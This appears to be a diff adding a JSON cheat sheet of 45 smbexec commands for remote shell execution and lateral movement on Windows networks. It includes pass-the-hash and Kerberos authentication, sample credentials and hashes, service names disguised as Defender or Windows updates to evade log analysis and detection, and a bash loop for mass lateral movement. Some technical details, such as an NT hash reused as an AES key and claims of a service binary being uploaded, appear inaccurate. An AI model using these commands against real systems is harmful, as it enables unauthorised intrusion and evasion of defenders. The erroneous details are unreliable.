@@ -1,0 +1,322 @@
+{
+    "tool": "smbexec",
+    "description": "Complete SMBExec command and workflow reference from basic to advanced remote execution and lateral movement",
+    "total_commands": 45,
+    "commands": [
+        {
+            "id": 1,
+            "category": "Basic Remote Execution",
+            "command": "smbexec.py administrator:password@192.168.1.10",
+            "example": "smbexec.py administrator:Summer2025!@192.168.1.10",
+            "explanation": "Executes a semi-interactive shell on a remote Windows host using local credentials."
+        },
+        {
+            "id": 2,
+            "category": "Basic Remote Execution",
+            "command": "smbexec.py domain/administrator:password@192.168.1.10",
+            "example": "smbexec.py corp.local/admin:P@ssword123@192.168.1.10",
+            "explanation": "Connects to a target using domain credentials."
+        },
+        {
+            "id": 3,
+            "category": "Basic Remote Execution",
+            "command": "smbexec.py domain/user:password@hostname",
+            "example": "smbexec.py corp/jdoe:secret@fileserver01",
+            "explanation": "Targets a host by hostname instead of IP address."
+        },
+        {
+            "id": 4,
+            "category": "NTLM Hash Authentication",
+            "command": "smbexec.py -hashes :<NTHash> administrator@192.168.1.10",
+            "example": "smbexec.py -hashes :8846F7EAEE8FB117AD06BDD830B7586C administrator@192.168.1.10",
+            "explanation": "Performs Pass-the-Hash authentication using only the NT hash."
+        },
+        {
+            "id": 5,
+            "category": "NTLM Hash Authentication",
+            "command": "smbexec.py -hashes <LMHash>:<NTHash> administrator@192.168.1.10",
+            "example": "smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C administrator@192.168.1.10",
+            "explanation": "Performs Pass-the-Hash using both LM and NT hashes."
+        },
+        {
+            "id": 6,
+            "category": "Authentication Handling",
+            "command": "smbexec.py -no-pass administrator@192.168.1.10",
+            "example": "smbexec.py -no-pass administrator@192.168.1.10",
+            "explanation": "Attempts to connect without a password, useful if a null session or existing trust allows it."
+        },
+        {
+            "id": 7,
+            "category": "Kerberos Authentication",
+            "command": "smbexec.py -k -no-pass target.domain.local",
+            "example": "smbexec.py -k -no-pass file01.corp.local",
+            "explanation": "Uses an existing TGT from the KRB5CCNAME environment variable for Kerberos authentication."
+        },
+        {
+            "id": 8,
+            "category": "Kerberos Authentication",
+            "command": "smbexec.py -k -no-pass -dc-ip <DC_IP> target.domain.local",
+            "example": "smbexec.py -k -no-pass -dc-ip 192.168.1.5 file01.corp.local",
+            "explanation": "Authenticates via Kerberos while manually specifying the Domain Controller IP."
+        },
+        {
+            "id": 9,
+            "category": "Kerberos Authentication",
+            "command": "smbexec.py -aesKey <hex_key> user@192.168.1.10",
+            "example": "smbexec.py -aesKey 8e5f...9a1b administrator@192.168.1.10",
+            "explanation": "Authenticates using the AES256 key for Kerberos instead of a password or NTLM hash."
+        },
+        {
+            "id": 10,
+            "category": "Service Customization",
+            "command": "smbexec.py -service-name <name> administrator@192.168.1.10",
+            "example": "smbexec.py -service-name UpdaterService administrator@192.168.1.10",
+            "explanation": "Sets a custom name for the service created on the remote host to blend in."
+        },
+        {
+            "id": 11,
+            "category": "Execution Mode",
+            "command": "smbexec.py -mode SHARE administrator@192.168.1.10",
+            "example": "smbexec.py -mode SHARE administrator@192.168.1.10",
+            "explanation": "Forces SHARE mode where output is written to a remote share file and read back."
+        },
+        {
+            "id": 12,
+            "category": "Execution Mode",
+            "command": "smbexec.py -mode SERVER administrator@192.168.1.10",
+            "example": "smbexec.py -mode SERVER administrator@192.168.1.10",
+            "explanation": "Forces SERVER mode where a local SMB server is raised to receive command output."
+        },
+        {
+            "id": 13,
+            "category": "Execution Mode",
+            "command": "smbexec.py -share <share_name> administrator@192.168.1.10",
+            "example": "smbexec.py -share ADMIN$ administrator@192.168.1.10",
+            "explanation": "Specifies a specific share (e.g., ADMIN$ or C$) to use for uploading the service executable."
+        },
+        {
+            "id": 14,
+            "category": "Target Specification",
+            "command": "smbexec.py -target-ip <ip> domain/user@hostname",
+            "example": "smbexec.py -target-ip 192.168.1.20 corp/admin@ws-hr-01",
+            "explanation": "Resolves the hostname manually to a specific target IP address."
+        },
+        {
+            "id": 15,
+            "category": "Target Specification",
+            "command": "smbexec.py -port 445 administrator@192.168.1.10",
+            "example": "smbexec.py -port 445 administrator@192.168.1.10",
+            "explanation": "Explicitly sets the destination port, useful if port forwarding or non-standard ports are in use."
+        },
+        {
+            "id": 16,
+            "category": "Output and Debugging",
+            "command": "smbexec.py -debug administrator@192.168.1.10",
+            "example": "smbexec.py -debug administrator@192.168.1.10",
+            "explanation": "Enables verbose debug output to troubleshoot connection or authentication issues."
+        },
+        {
+            "id": 17,
+            "category": "Output and Debugging",
+            "command": "smbexec.py -codec <codec_name> administrator@192.168.1.10",
+            "example": "smbexec.py -codec utf-8 administrator@192.168.1.10",
+            "explanation": "Sets the text encoding used for the remote output to handle non-ASCII characters."
+        },
+        {
+            "id": 18,
+            "category": "Advanced Authentication",
+            "command": "smbexec.py -k -debug target.local",
+            "example": "smbexec.py -k -debug database.corp.local",
+            "explanation": "Combines Kerberos authentication with debug mode to diagnose ticket issues."
+        },
+        {
+            "id": 19,
+            "category": "Lateral Movement Simulation",
+            "command": "smbexec.py -hashes :<NTHash> -service-name BTO_Service admin@192.168.1.10",
+            "example": "smbexec.py -hashes :8846... admin@192.168.1.10 -service-name SVC_BACKUP",
+            "explanation": "Simulates lateral movement using a hash and a custom service name to test detection logic."
+        },
+        {
+            "id": 20,
+            "category": "Red Team Operations",
+            "command": "smbexec.py -mode SERVER -service-name WinDefendUpdate admin@192.168.1.10",
+            "example": "smbexec.py -mode SERVER -service-name WinDefendUpdate admin@192.168.1.10",
+            "explanation": "Uses Server mode and a deceptive service name to evade simple log analysis."
+        },
+        {
+            "id": 21,
+            "category": "Red Team Operations",
+            "command": "smbexec.py -share C$ -service-name NetLogonHelper admin@192.168.1.10",
+            "example": "smbexec.py -share C$ -service-name NetLogonHelper admin@192.168.1.10",
+            "explanation": "Executes via the C$ share instead of ADMIN$ with a legitimate-sounding service name."
+        },
+        {
+            "id": 22,
+            "category": "Blue Team Validation",
+            "command": "smbexec.py -debug -service-name TEST_LATERAL_MOVE admin@192.168.1.10",
+            "example": "smbexec.py -debug -service-name TEST_LATERAL_MOVE admin@192.168.1.10",
+            "explanation": "Generates a noisy, easily identifiable service creation event for verifying SIEM alerts."
+        },
+        {
+            "id": 23,
+            "category": "Blue Team Validation",
+            "command": "smbexec.py -k -no-pass -service-name KRB_TEST target.local",
+            "example": "smbexec.py -k -no-pass -service-name KRB_TEST file01.local",
+            "explanation": "Tests detection rules for Kerberos-based service creation lateral movement."
+        },
+        {
+            "id": 24,
+            "category": "Complex Workflow",
+            "command": "smbexec.py -hashes :<NTHash> -dc-ip <DC_IP> domain/user@target_ip",
+            "example": "smbexec.py -hashes :8846... -dc-ip 10.0.0.5 corp/admin@10.0.0.20",
+            "explanation": "Authenticates to a specific target IP while directing authentication requests to a specific DC."
+        },
+        {
+            "id": 25,
+            "category": "Complex Workflow",
+            "command": "smbexec.py -mode SHARE -share IPC$ admin@192.168.1.10",
+            "example": "smbexec.py -mode SHARE -share IPC$ admin@192.168.1.10",
+            "explanation": "Attempts execution using the IPC$ share, often used to test restricted share access controls."
+        },
+        {
+            "id": 26,
+            "category": "Legacy/Compatibility",
+            "command": "smbexec.py -port 139 administrator@192.168.1.10",
+            "example": "smbexec.py -port 139 administrator@192.168.1.10",
+            "explanation": "Attempts to connect over the legacy NetBIOS Session Service port instead of port 445."
+        },
+        {
+            "id": 27,
+            "category": "Purple Team Validation",
+            "command": "smbexec.py -service-name AE_SVC_RANDOM admin@192.168.1.10",
+            "example": "smbexec.py -service-name AE_SVC_x892a admin@192.168.1.10",
+            "explanation": "Emulates an adversary using randomized service names to bypass static string detection."
+        },
+        {
+            "id": 28,
+            "category": "Privileged Access",
+            "command": "smbexec.py 'domain/Administrator':password@192.168.1.10",
+            "example": "smbexec.py 'corp/Administrator':Summer2025!@192.168.1.10",
+            "explanation": "Explicitly quotes the username to handle spaces or special characters in credentials."
+        },
+        {
+            "id": 29,
+            "category": "Incident Response Simulation",
+            "command": "smbexec.py -debug -service-name MALICIOUS_SERVICE admin@192.168.1.10",
+            "example": "smbexec.py -debug -service-name MALICIOUS_SERVICE admin@192.168.1.10",
+            "explanation": "Creates a distinct artifact to test the incident response team's ability to extract service binaries."
+        },
+        {
+            "id": 30,
+            "category": "Network Evasion",
+            "command": "smbexec.py -mode SERVER -port 445 admin@192.168.1.10",
+            "example": "smbexec.py -mode SERVER -port 445 admin@192.168.1.10",
+            "explanation": "Uses server mode to force the target to connect back to the attacker, altering traffic flow patterns."
+        },
+        {
+            "id": 31,
+            "category": "Automation Workflow",
+            "command": "smbexec.py -no-pass -k target.local < commands.txt",
+            "example": "smbexec.py -no-pass -k target.local < commands.txt",
+            "explanation": "Pipes a list of commands into the standard input for automated execution upon connection."
+        },
+        {
+            "id": 32,
+            "category": "Troubleshooting",
+            "command": "smbexec.py -debug -hashes :<NTHash> admin@192.168.1.10",
+            "example": "smbexec.py -debug -hashes :8846... admin@192.168.1.10",
+            "explanation": "Debugs a Pass-the-Hash connection to verify protocol negotiation and authentication steps."
+        },
+        {
+            "id": 33,
+            "category": "Advanced Target Specification",
+            "command": "smbexec.py domain/user:pass@192.168.1.10",
+            "example": "smbexec.py corp/jdoe:P@ssword@192.168.1.10",
+            "explanation": "Standard syntax for domain authentication against an IP address target."
+        },
+        {
+            "id": 34,
+            "category": "Advanced Target Specification",
+            "command": "smbexec.py localaccount:pass@192.168.1.10",
+            "example": "smbexec.py Administrator:P@ssword@192.168.1.10",
+            "explanation": "Authenticates using a local account (non-domain) on the remote machine."
+        },
+        {
+            "id": 35,
+            "category": "Interactive Handling",
+            "command": "smbexec.py admin:pass@192.168.1.10",
+            "example": "smbexec.py admin:pass@192.168.1.10",
+            "explanation": "Upon successful connection, smbexec drops into a semi-interactive CMD.EXE shell."
+        },
+        {
+            "id": 36,
+            "category": "Service Cleanup Check",
+            "command": "smbexec.py -service-name TEMP_SVC admin@192.168.1.10",
+            "example": "smbexec.py -service-name TEMP_SVC admin@192.168.1.10",
+            "explanation": "Used to verify that the tool correctly deletes the service 'TEMP_SVC' after the session exits."
+        },
+        {
+            "id": 37,
+            "category": "Blind Execution",
+            "command": "smbexec.py -mode SHARE -no-pass -k target.local",
+            "example": "smbexec.py -mode SHARE -no-pass -k db-prod.local",
+            "explanation": "Uses Kerberos and Share mode for environments where direct server callbacks are blocked by firewalls."
+        },
+        {
+            "id": 38,
+            "category": "Cross-Forest",
+            "command": "smbexec.py child.root.local/admin:pass@rootdc.root.local",
+            "example": "smbexec.py us.corp.local/admin:pass@uk.corp.local",
+            "explanation": "Demonstrates lateral movement across trust boundaries using explicit domain credentials."
+        },
+        {
+            "id": 39,
+            "category": "Detection Evasion",
+            "command": "smbexec.py -service-name '' admin@192.168.1.10",
+            "example": "smbexec.py -service-name '' admin@192.168.1.10",
+            "explanation": "Attempts to execute with an empty service name to test robustness of parser and logging (may fail on some versions)."
+        },
+        {
+            "id": 40,
+            "category": "Full Stealth Simulation",
+            "command": "smbexec.py -k -no-pass -mode SERVER -service-name MS_Update admin@target",
+            "example": "smbexec.py -k -no-pass -mode SERVER -service-name MS_Update admin@ws01.local",
+            "explanation": "Maximizes stealth by combining Kerberos (no NTLM), Server mode (no share drop), and a deceptive name."
+        },
+        {
+            "id": 41,
+            "category": "Key-Based Auth",
+            "command": "smbexec.py -aesKey <key> -dc-ip <IP> user@target",
+            "example": "smbexec.py -aesKey 8846... -dc-ip 10.10.10.1 administrator@10.10.10.5",
+            "explanation": "Uses AES keys for authentication while pinning the DC to avoid DNS poisoning or spoofing."
+        },
+        {
+            "id": 42,
+            "category": "Prompt Handling",
+            "command": "smbexec.py admin@192.168.1.10",
+            "example": "smbexec.py admin@192.168.1.10",
+            "explanation": "If the password is omitted in the command line, smbexec will securely prompt for it."
+        },
+        {
+            "id": 43,
+            "category": "Hash Formats",
+            "command": "smbexec.py -hashes LM:NT domain/user@ip",
+            "example": "smbexec.py -hashes aad3...:8846... corp/user@192.168.1.50",
+            "explanation": "Standard syntax for passing full LM:NT hash pairs for domain accounts."
+        },
+        {
+            "id": 44,
+            "category": "Mass Execution Scripting",
+            "command": "for ip in $(cat targets.txt); do smbexec.py admin:pass@$ip; done",
+            "example": "for ip in $(cat targets.txt); do smbexec.py admin:pass@$ip; done",
+            "explanation": "Conceptual bash loop demonstrating how smbexec is wrapped for mass lateral movement."
+        },
+        {
+            "id": 45,
+            "category": "Exit Behavior",
+            "command": "exit",
+            "example": "exit",
+            "explanation": "Typing exit inside the smbexec shell terminates the remote service and cleans up the binary."
+        }
+    ]
+}
